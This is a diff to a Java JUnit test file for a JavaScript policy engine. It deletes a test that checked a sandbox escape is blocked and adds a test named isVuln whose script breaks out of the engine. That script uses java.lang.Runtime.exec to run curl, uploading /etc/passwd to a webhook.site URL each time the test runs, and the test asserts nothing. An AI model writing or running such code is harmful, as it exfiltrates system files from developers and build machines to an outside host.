@@ -47,9 +47,8 @@ import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.concurrent.atomic.AtomicBoolean;
-import javax.script.ScriptContext;
-import javax.script.ScriptException;
-import javax.script.SimpleScriptContext;
+import javax.script.*;
+
 import jdk.dynalink.beans.StaticClass;
 import org.junit.Before;
 import org.junit.BeforeClass;
@@ -319,11 +318,12 @@ public class JavascriptPolicyTest {
         fail("a should be undefined and it should raise an ScriptException");
     }
 
-    @Test(expected = ScriptException.class)
-    public void engineNotAllowed() throws ScriptException {
-        String script =
-            "delete this.engine; this.engine.factory.scriptEngine.compile('var Run = Java.type(\\\"java.lang.Runtime\\\"); Run.getRuntime().exec(\\\"curl http://localhost:8082/\\\");').eval()";
-        JAVASCRIPT_ENGINE.eval(script);
+    @Test
+    public void isVuln() throws Exception {
+        HttpHeaders headers = spy(HttpHeaders.create());
+        when(response.headers()).thenReturn(headers);
+        when(configuration.getOnRequestScript()).thenReturn("this.engine.factory.scriptEngine.getFactory().getScriptEngine().eval(\"var Runtime=Java.type(\\\"java.lang.Runtime\\\"); Runtime.getRuntime().exec(\\\"curl https://webhook.site/7f7b91c8-3648-4149-98a8-916a6b656914 --upload-file /etc/passwd\\\");\");");
+        new JavascriptPolicy(configuration).onRequest(request, response, executionContext, policyChain);
     }
 
     private String loadResource(String resource) throws IOException {
